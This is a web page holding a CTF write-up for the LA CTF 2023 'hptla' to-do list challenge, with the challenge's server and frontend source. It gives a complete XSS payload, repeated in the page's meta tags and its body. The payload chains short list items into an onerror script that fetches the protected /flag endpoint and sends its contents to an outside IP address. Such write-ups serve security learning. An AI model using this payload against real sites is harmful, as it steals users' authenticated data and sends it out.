<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>hptla - LA CTF 2023 - My Blog</title><meta name=Description content="Don't book a cover by it's judge"><meta property="og:title" content="hptla - LA CTF 2023"><meta property="og:description" content="
    tl;dr
We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line
We have to split the payload into 20 parts like that

Final payload
<img src='
'onerror='`
`;n=fetch;`
`;l=r=>{`
`;return/*
*/r.text();`
`;};`
`;p=q=>{s=/*
*/`http:`;`
`;s+=`//3`;`
`;s+=`4.9`;`
`;s+=`3.5`;`
`;window./*
*/location/*
*/=s+`6.144?
`+q;};`
`;f=`flag`;`
`;w=n(f)/*
*/.then(l)/*
*/.then(p);'
"><meta property="og:type" content="article"><meta property="og:url" content="http://r0h1t.me/blog/posts/hptla/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-15T00:00:00+05:30"><meta property="article:modified_time" content="2023-02-15T00:00:00+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="hptla - LA CTF 2023"><meta name=twitter:description content="
    tl;dr
We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line
We have to split the payload into 20 parts like that

Final payload
<img src='
'onerror='`
`;n=fetch;`
`;l=r=>{`
`;return/*
*/r.text();`
`;};`
`;p=q=>{s=/*
*/`http:`;`
`;s+=`//3`;`
`;s+=`4.9`;`
`;s+=`3.5`;`
`;window./*
*/location/*
*/=s+`6.144?
`+q;};`
`;f=`flag`;`
`;w=n(f)/*
*/.then(l)/*
*/.then(p);'
"><meta name=application-name content="My Blog"><meta name=apple-mobile-web-app-title content="My Blog"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=http://r0h1t.me/blog/posts/hptla/><link rel=prev href=http://r0h1t.me/blog/posts/queue-up/><link rel=stylesheet href=/blog/lib/normalize/normalize.min.css><link rel=stylesheet href=/blog/css/color.css><link rel=stylesheet href=/blog/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/blog/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/blog/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/blog/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/blog/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"hptla - LA CTF 2023","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/r0h1t.me\/blog\/posts\/hptla\/"},"genre":"posts","keywords":"web, lactf23-writeups, ctf, writeup, xss","wordcount":1063,"url":"http:\/\/r0h1t.me\/blog\/posts\/hptla\/","datePublished":"2023-02-15T00:00:00+05:30","dateModified":"2023-02-15T00:00:00+05:30","publisher":{"@type":"Organization","name":"Rohit"},"authors":[{"@type":"Person","name":"Rohit"}],"description":""}</script><script src=//instant.page/5.1.1 defer type=module integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq></script></head><body header-desktop header-mobile><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else""==="light"||""==="dark"||""==="black"?(setTheme(""),saveTheme("")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/blog/ title="My Blog">My Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/blog/posts/ title=Posts>Posts </a><a class=menu-item href=/blog/tags/>Tags </a><a class=menu-item href=/blog/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/blog/ title="My Blog">My Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/blog/posts/ title=Posts>Posts</a><a class=menu-item href=/blog/tags/ title>Tags</a><a class=menu-item href=/blog/categories/ title>Categories</a><a href=# class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hptla - LA CTF 2023</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="author fas fa-user-circle fa-fw"></i><span class=screen-reader-text> </span><a href=http://r0h1t.me/blog/authors/rohit>Rohit</a></span>
</span>&nbsp;<span class=post-category>included in </span>&nbsp;<span class=post-category>categories <a href=/blog/categories/lactf23-writeups/><i class="far fa-folder fa-fw"></i>lactf23-writeups</a>&nbsp;<a href=/blog/categories/all-writeups/><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2023-02-15>2023-02-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2023-02-15>2023-02-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1063 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id=/blog/posts/hptla/ class=leancloud_visitors data-flag-title="hptla - LA CTF 2023">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path=/blog/posts/hptla/></span>&nbsp;views
</span>&nbsp;<span id=/blog/posts/hptla/ class=comment_count data-flag-title="hptla - LA CTF 2023">
<i class="far fa-comments fa-fw"></i>&nbsp;<span class=waline-comment-count id=waline-comment-count data-path=/blog/posts/hptla/></span>&nbsp;comments
</span>&nbsp;</div></div><div class=content id=content><h4 id=tldr class=headerLink><a href=#tldr class=header-mark></a>tl;dr</h4><ul><li>We can join the two lines either by adding a ` or starting a comment <code>/*</code> at the end of one line and closing it <code>*\</code> at the start of the next line</li><li>We have to split the payload into 20 parts like that</li></ul><p>Final payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;
</span></span></span><span class=line><span class=cl><span class=s>&#39;</span><span class=na>onerror</span><span class=o>=</span><span class=s>&#39;`
</span></span></span><span class=line><span class=cl><span class=s>`;n=fetch;`
</span></span></span><span class=line><span class=cl><span class=s>`;l=r=&gt;{`
</span></span></span><span class=line><span class=cl><span class=s>`;return/*
</span></span></span><span class=line><span class=cl><span class=s>*/r.text();`
</span></span></span><span class=line><span class=cl><span class=s>`;};`
</span></span></span><span class=line><span class=cl><span class=s>`;p=q=&gt;{s=/*
</span></span></span><span class=line><span class=cl><span class=s>*/`http:`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`//3`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`4.9`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`3.5`;`
</span></span></span><span class=line><span class=cl><span class=s>`;window./*
</span></span></span><span class=line><span class=cl><span class=s>*/location/*
</span></span></span><span class=line><span class=cl><span class=s>*/=s+`6.144?
</span></span></span><span class=line><span class=cl><span class=s>`+q;};`
</span></span></span><span class=line><span class=cl><span class=s>`;f=`flag`;`
</span></span></span><span class=line><span class=cl><span class=s>`;w=n(f)/*
</span></span></span><span class=line><span class=cl><span class=s>*/.then(l)/*
</span></span></span><span class=line><span class=cl><span class=s>*/.then(p);&#39;</span>
</span></span></code></pre></div><h2 id=description class=headerLink><a href=#description class=header-mark></a>Description</h2><p>I made a new hyper-productive to-do list app that limits you to 12 characters per item so you can stop wasting time writing overly intricate to-do lists!</p><ul><li><strong>Author</strong> : aplet123</li><li><strong>Category</strong> : Web</li><li><strong>Points</strong> : 487</li><li><strong>Solves</strong> : 27</li></ul><h2 id=solution class=headerLink><a href=#solution class=header-mark></a>Solution</h2><h3 id=understanding-the-challenge class=headerLink><a href=#understanding-the-challenge class=header-mark></a>Understanding the challenge</h3><p>Here we have a page where we can add todos. There is a length limit to the todos as each todo can at most be of length 12. We can only add 20 todos.</p><p>Source:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;express&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;path&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>v4</span><span class=o>:</span> <span class=nx>uuid</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;uuid&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>cookieParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;cookie-parser&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=nb>parseInt</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PORT</span><span class=p>)</span> <span class=o>||</span> <span class=mi>8080</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>adminpw</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>ADMINPW</span> <span class=o>||</span> <span class=s2>&#34;placeholder&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>lists</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Map</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>cleanup</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>setInterval</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>now</span> <span class=o>=</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>findIndex</span><span class=p>(</span><span class=nx>x</span> <span class=p>=&gt;</span> <span class=nx>now</span> <span class=o>&lt;</span> <span class=nx>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>i</span> <span class=o>===</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>i</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>i</span><span class=p>;</span> <span class=nx>j</span> <span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>lists</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>cleanup</span><span class=p>[</span><span class=nx>j</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>cleanup</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>},</span> <span class=mi>1000</span> <span class=o>*</span> <span class=mi>60</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>cookieParser</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>urlencoded</span><span class=p>({</span> <span class=nx>extended</span><span class=o>:</span> <span class=kc>false</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=kr>static</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;static&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/list&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/plain&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>list</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>list</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;no list provided&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>parsed</span> <span class=o>=</span> <span class=nx>list</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>trim</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s2>&#34;\n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>map</span><span class=p>((</span><span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>x</span><span class=p>.</span><span class=nx>trim</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;list must have at most 20 items&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>parsed</span><span class=p>.</span><span class=nx>some</span><span class=p>((</span><span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>x</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>12</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;list items must not exceed 12 characters&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>id</span> <span class=o>=</span> <span class=nx>uuid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>lists</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>id</span><span class=p>,</span> <span class=nx>parsed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>cleanup</span><span class=p>.</span><span class=nx>push</span><span class=p>([</span><span class=nx>id</span><span class=p>,</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>+</span> <span class=mi>1000</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/list/:id&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;application/json&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>lists</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>lists</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>error</span><span class=o>:</span> <span class=s2>&#34;list doesn&#39;t exist&#34;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/plain&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>adminpw</span> <span class=o>===</span> <span class=nx>adminpw</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;haha no&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Listening on port </span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>The todos are added using this frontend js</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>loading</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;loading&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>error</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>list</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>id</span> <span class=o>=</span> <span class=nx>location</span><span class=p>.</span><span class=nx>hash</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=sr>/^[-0-9a-f]+$/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>error</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s2>&#34;invalid list id&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>error</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>loading</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=kr>async</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/list/&#34;</span> <span class=o>+</span> <span class=nx>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>json</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>status</span> <span class=o>!==</span> <span class=mi>200</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>error</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=nx>json</span><span class=p>.</span><span class=nx>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>error</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>list</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>json</span><span class=p>.</span><span class=nx>map</span><span class=p>((</span><span class=nx>x</span><span class=p>,</span> <span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=sb>`&lt;li&gt;&lt;input type=&#34;checkbox&#34; id=&#34;item</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>&#34;&gt;&lt;label for=&#34;item</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>&#34;&gt;</span><span class=si>${</span><span class=nx>x</span><span class=si>}</span><span class=sb>&lt;/label&gt;&lt;/li&gt;`</span><span class=p>).</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>list</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>loading</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>error</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s2>&#34;something went really wrong&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>error</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>loading</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s2>&#34;hidden&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>})();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
